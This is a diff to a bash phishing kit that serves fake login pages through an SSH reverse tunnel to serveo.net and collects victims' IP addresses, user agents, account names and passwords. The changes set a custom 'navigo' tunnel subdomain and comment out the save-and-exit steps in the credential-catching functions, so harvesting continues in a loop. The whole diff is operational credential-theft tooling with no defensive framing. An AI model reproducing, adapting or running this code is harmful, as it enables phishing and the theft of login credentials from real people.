@@ -263,17 +263,16 @@ catch_cred() {
 account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
-killall -2 php > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
-killall ssh > /dev/null 2>&1
-if [[ -e sendlink ]]; then
-rm -rf sendlink
-fi
-exit 1
+
+#cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
+#printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
+#killall -2 php > /dev/null 2>&1
+#killall -2 ngrok > /dev/null 2>&1
+#killall ssh > /dev/null 2>&1
+#if [[ -e sendlink ]]; then
+#rm -rf sendlink
+#fi
+#exit 1
 
 }
 
@@ -283,18 +282,19 @@ while [ true ]; do
 
 
 if [[ -e "sites/$server/usernames.txt" ]]; then
-printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
+#printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
 catch_cred
 
 fi
 sleep 1
 done 
-
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
 
 }
 
 catch_ip() {
-touch sites/$server/saved.usernames.txt
+#touch sites/$server/saved.usernames.txt
 ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
@@ -374,8 +374,9 @@ fi
 ##
 printf "\n"
 rm -rf iptracker.log
-
 getcredentials
+
+
 }
 
 ##
@@ -388,7 +389,7 @@ command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not instal
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R navigo:80:localhost:'$port' navigo.serveo.net 2> /dev/null > sendlink ' &
 printf "\n"
 sleep 10 # &
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
@@ -406,9 +407,9 @@ startx() {
 if [[ -e sites/$server/ip.txt ]]; then
 rm -rf sites/$server/ip.txt
 
-fi
-if [[ -e sites/$server/usernames.txt ]]; then
-rm -rf sites/$server/usernames.txt
+#fi
+#if [[ -e sites/$server/usernames.txt ]]; then
+#rm -rf sites/$server/usernames.txt
 
 fi
 
@@ -512,11 +513,10 @@ fi
 
 }
 checkfound() {
-
 printf "\n"
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
-while [ true ]; do
 
+while true; do
 
 if [[ -e "sites/$server/ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
